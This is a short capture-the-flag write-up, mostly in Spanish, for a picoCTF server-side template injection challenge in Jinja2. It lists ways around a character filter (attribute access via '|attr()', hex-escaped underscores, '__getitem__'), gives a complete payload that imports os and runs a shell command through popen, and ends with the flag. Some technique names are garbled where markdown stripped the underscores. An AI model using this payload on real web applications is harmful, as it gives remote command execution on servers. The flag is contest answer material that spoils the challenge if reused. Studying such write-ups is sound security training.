#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:52849/)!

Ahora el sitio web se ha vuelto seguro a partir de simples cargas útiles y necesitamos eludir su protección. Uso de diferentes símbolos y nuevos comandos.

# *Técnicas clave de derivación*

1. Evitar la notación de puntos ('.') → utiliza '|attr()' para acceder dinámicamente a los atributos:  
  
request|attr('application')|attr("_globals_")  
  
— Omite los WAF que bloquean 'request.application._globals_'.

> 2. Codificación hexadecimal ('\x5f') para guiones ('_')  
>   
> bajos "\x5f\x5fglobals\x5f\x5f"  
>   
> — Omite los filtros que bloquean '_globals', 'builtins' y 'import_'.
> 
> 3. Usando '_getitem_()' en lugar de '[]'  
> jinja2  
> |attr('_getitem')('builtins_')  
>   
> — Evade las protecciones que bloquean '_builtins['import_']'.

4. Jinja2 Sandbox Escape  
: accede a 'request.application._globals_' para obtener las funciones integradas de Python.

> 5. RCE sin 'eval()' o 'exec()'  
>   
> _import_('os').popen('id').read()  
>   
> — Evita los bloqueos 'os.system()' y 'subprocess. Popen()'.

*Nuestra carga útil final:*

> {{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('cat flag')|attr('read')()}}

**Respuesta en el formato del concurso:**
picoCTF{sst1_f1lt3r_byp4ss_8b534b82}